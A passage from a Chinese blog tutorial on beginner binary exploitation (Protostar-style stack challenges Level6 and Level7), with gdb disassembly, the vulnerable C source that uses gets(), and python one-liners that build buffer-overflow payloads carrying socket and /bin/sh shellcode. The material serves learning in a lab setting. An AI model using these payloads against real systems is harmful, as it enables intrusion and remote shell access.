class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看getpath函数的ret指令地址：</span></span><br><span class="line">gdb-peda$ disassemble getpath</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getpath:</span><br><span class="line">   0x08048484 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048485 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048487 &lt;+3&gt;:	sub    esp,0x68</span><br><span class="line">   0x0804848a &lt;+6&gt;:	mov    eax,0x80485d0</span><br><span class="line">   0x0804848f &lt;+11&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048492 &lt;+14&gt;:	call   0x80483c0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048497 &lt;+19&gt;:	mov    eax,ds:0x8049720</span><br><span class="line">   0x0804849c &lt;+24&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804849f &lt;+27&gt;:	call   0x80483b0 &lt;fflush@plt&gt;</span><br><span class="line">   0x080484a4 &lt;+32&gt;:	lea    eax,[ebp-0x4c]</span><br><span class="line">   0x080484a7 &lt;+35&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484aa &lt;+38&gt;:	call   0x8048380 &lt;gets@plt&gt;</span><br><span class="line">   0x080484af &lt;+43&gt;:	mov    eax,DWORD PTR [ebp+0x4]</span><br><span class="line">   0x080484b2 &lt;+46&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x080484b5 &lt;+49&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484b8 &lt;+52&gt;:	and    eax,0xbf000000</span><br><span class="line">   0x080484bd &lt;+57&gt;:	cmp    eax,0xbf000000</span><br><span class="line">   0x080484c2 &lt;+62&gt;:	jne    0x80484e4 &lt;getpath+96&gt;</span><br><span class="line">   0x080484c4 &lt;+64&gt;:	mov    eax,0x80485e4</span><br><span class="line">   0x080484c9 &lt;+69&gt;:	mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484cc &lt;+72&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080484d0 &lt;+76&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484d3 &lt;+79&gt;:	call   0x80483c0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x080484d8 &lt;+84&gt;:	mov    DWORD PTR [esp],0x1</span><br><span class="line">   0x080484df &lt;+91&gt;:	call   0x80483a0 &lt;_exit@plt&gt;</span><br><span class="line">   0x080484e4 &lt;+96&gt;:	mov    eax,0x80485f0</span><br><span class="line">   0x080484e9 &lt;+101&gt;:	lea    edx,[ebp-0x4c]</span><br><span class="line">   0x080484ec &lt;+104&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080484f0 &lt;+108&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080484f3 &lt;+111&gt;:	call   0x80483c0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x080484f8 &lt;+116&gt;:	leave  </span><br><span class="line">   0x080484f9 &lt;+117&gt;:	ret        &lt;--- \xf9\x84\x04\x08</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode的地址</span></span><br><span class="line">0xffffd210   在上面</span><br></pre></td></tr></table></figure></p>
+<p>　　那么最终payload的格式是这样的：<br>　　<code>&#39;A&#39; * 80 | ret指令地址 | shellcode的地址 | 隔离&#39;\x90&#39; * 10| shellcode</code><br>　　我还是用上面的那个shellcode来构造最终的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 输出paylaod 804835f</span><br><span class="line">echo `python -c &quot;print &apos;A&apos; * 80 + &apos;\x5f\x83\x04\x08&apos; +&apos;\x10\xd2\xff\xff&apos; + &apos;\x31\xc0\x31\xdb\x50\x40\x50\x40\x50\x89\xe1\xb0\x33\x04\x33\x43\xcd\x80\x89\xc6\x31\xc0\x50\xc6\x04\x24\x7f\xc6\x44\x24\x03\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\xb0\x33\x04\x33\x50\x51\x56\x89\xe1\x43\xcd\x80\x31\xd2\x87\xca\xb1\x03\x89\xf3\x31\xc0\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x51\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&apos;&quot;` &gt; payload6.txt</span><br></pre></td></tr></table></figure></p>
+<p>　　<img src="/img/入坑Pwn-基本习题和知识/12.png" alt="">
+　　</p>
+<h3 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xb0000000</span>) == <span class="number">0xb0000000</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">  <span class="keyword">return</span> strdup(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　paylaod同上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `python -c &quot;print &apos;A&apos; * 80 + &apos;\x83\x83\04\x08&apos; + &apos;\x00\xd2\xff\xff&apos; + &apos;\x90&apos;*20 + &apos;\x31\xc0\x31\xdb\x50\x40\x50\x40\x50\x89\xe1\xb0\x33\x04\x33\x43\xcd\x80\x89\xc6\x31\xc0\x50\xc6\x04\x24\x7f\xc6\x44\x24\x03\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\xb0\x33\x04\x33\x50\x51\x56\x89\xe1\x43\xcd\x80\x31\xd2\x87\xca\xb1\x03\x89\xf3\x31\xc0\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x51\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&apos;&quot;` &gt; payload7.txt</span><br></pre></td></tr></table></figure></p>
+<p>　　<img src="/img/入坑Pwn-基本习题和知识/12.png" alt=""></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://lzwgiter.github.io">float</a>
+            <p>原文链接: <a href="http://lzwgiter.github.io/入坑Pwn---基本习题和知识/">http://lzwgiter.github.io/入坑Pwn---基本习题和知识/</a>
+            <p>发表日期: <a href="http://lzwgiter.github.io/入坑Pwn---基本习题和知识/">September 29th 2019, 12:26:38 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/记一次简单的ROP攻击/" title= 记一次简单的ROP攻击 >
+                    <div class="nextTitle">记一次简单的ROP攻击</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/Apache-Commons-Collections反序列化漏洞/" title= Apache-Commons-Collections反序列化漏洞 >
+                    <div class="prevTitle">Apache-Commons-Collections反序列化漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:float311@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/lzwgiter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本知识"><span class="toc-number">1.</span> <span class="toc-text">基本知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#要准备的工具-带后续补充"><span class="toc-number">2.</span> <span class="toc-text">要准备的工具(带后续补充)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwnable习题"><span class="toc-number">3.</span> <span class="toc-text">Pwnable习题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF习题"><span class="toc-number">4.</span> <span class="toc-text">BUUCTF习题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单示例习题"><span class="toc-number">5.</span> <span class="toc-text">简单示例习题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level0"><span class="toc-number">5.1.</span> <span class="toc-text">Level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level1"><span class="toc-number">5.2.</span> <span class="toc-text">Level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level2"><span class="toc-number">5.3.</span> <span class="toc-text">Level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level3"><span class="toc-number">5.4.</span> <span class="toc-text">Level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level4"><span class="toc-number">5.5.</span> <span class="toc-text">Level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level5"><span class="toc-number">5.6.</span> <span class="toc-text">Level5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level6"><span class="toc-number">5.7.</span> <span class="toc-text">Level6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level7"><span class="toc-number">5.8.</span> <span class="toc-text">Level7</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 49
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/记一次简单的ROP攻击/" >记一次简单的ROP攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/入坑Pwn---基本习题和知识/" >入坑Pwn---基本习题和知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/Apache-Commons-Collections反序列化漏洞/" >Apache-Commons-Collections反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/Java反序列化漏洞学习(上)/" >Java反序列化漏洞学习（上）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/记录一次对win2k3-Enterprise-Edition的永恒之蓝利用/" >记录一次对win2k3 Enterprise Edition的永恒之蓝利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span><a class="archive-post-title" href= "/kali-渗透测试-信息收集3/" >kali-渗透测试-信息收集3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/kali-渗透测试-信息收集2/" >kali-渗透测试-信息收集2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/kali-渗透测试-信息收集1/" >kali-渗透测试-信息收集1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-客户端渗透攻击/" >Metasploit渗透测试魔鬼训练营-客户端渗透攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/" >Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-web应用渗透/" >Metasploit渗透测试魔鬼训练营-web应用渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-服务扫描与查点/" >Metasploit渗透测试魔鬼训练营-服务扫描与查点</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/04</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-信息收集/" >Metasploit渗透测试魔鬼训练营-信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/Metasploit渗透测试魔鬼训练营-环境搭建/" >Metasploit渗透测试魔鬼训练营 第一天</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/Typecho-反序列化漏洞/" >小明的博客--Typecho 反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/Bugku的一道注入---多次/" >Bugku的一道注入---多次</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/Bugku的一道注入---INSERT INTO注入/" >Bugku的一道注入--INSERT INTO注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/ThinkPHP框架学习---路由/" >ThinkPHP框架学习---路由</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---框架目录及框架配置/" >ThinkPHP框架学习---框架目录及框架配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/ThinkPHP框架学习---config类和config助手函数/" >ThinkPHP框架学习---config类和config助手函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/Nmap使用指南/" >Nmap使用指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/Mysql小记---二/" >Mysql小记(二)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/PHP学习-超级全局变量/" >PHP学习--超级全局变量</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/PHP学习-变量/" >PHP学习--变量</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/PHP框架之MVC模式学习/" >PHP框架MVC学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/CTF中的python脚本题小结（二）/" >CTF中的python脚本题小结（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/CTF中的python脚本题小结（一）/" >CTF中的python脚本题小结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/Hackergame-2018-wp/" >Hackergame 2018 wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/安恒九月题的misc和一道web/" >安恒九月题的misc和一道web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/Mysql小记---一/" >Mysql小记(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/隐写术-LSB隐写/" >隐写术-LSB隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/隐写术-NTFS流隐写/" >隐写术--NTFS流隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/CTF常见隐写手段小结/" >CTF常见隐写手段小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span><a class="archive-post-title" href= "/DOM-文档对象模型基础/" >DOM 文档对象模型</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之history和screen对象/" >BOM-浏览器操作对象模型之history和screen对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之navigator、location对象/" >BOM 浏览器操作对象模型之navigator、location对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/BOM-浏览器操作对象模型之window对象/" >BOM 浏览器操作对象模型之window对象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/Javascript基础之数据类型2/" >Javascript基础之数据类型2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/Javascript基础之数据类型1/" >Javascript基础之数据类型1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/CTF ZIP结构/" >CTF隐写术--关于ZIP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/CSS基础4.4--选择器之伪类选择器/" >CSS样式基础4.4--选择器之伪类选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/猫片/" >Bugku的一道misc-----猫片</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/CSS基础4.3--选择器之属性选择器/" >CSS基础4.3--选择器之属性选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/CSS基础4.2--选择器之组合选择器/" >CSS基础4.2--选择器之组合选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/CSS基础4.1--选择器之基本选择器/" >CSS基础4.1--选择器之基本选择器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/CSS基础3.2--特性之继承性/" >CSS基础3.2--特性之继承性</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础3.1--特性之层叠性/" >CSS基础3.1--特性之层叠性</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础2--应用/" >CSS基础2--应用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/CSS基础1--样式/" >CSS基础1--样式</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Javascript"><span class="iconfont-archer">&#xe606;</span>Javascript</span>
+    
+        <span class="sidebar-tag-name" data-tags="BOM"><span class="iconfont-archer">&#xe606;</span>BOM</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Bugku"><span class="iconfont-archer">&#xe606;</span>Bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写术"><span class="iconfont-archer">&#xe606;</span>隐写术</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="DOM"><span class="iconfont-archer">&#xe606;</span>DOM</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
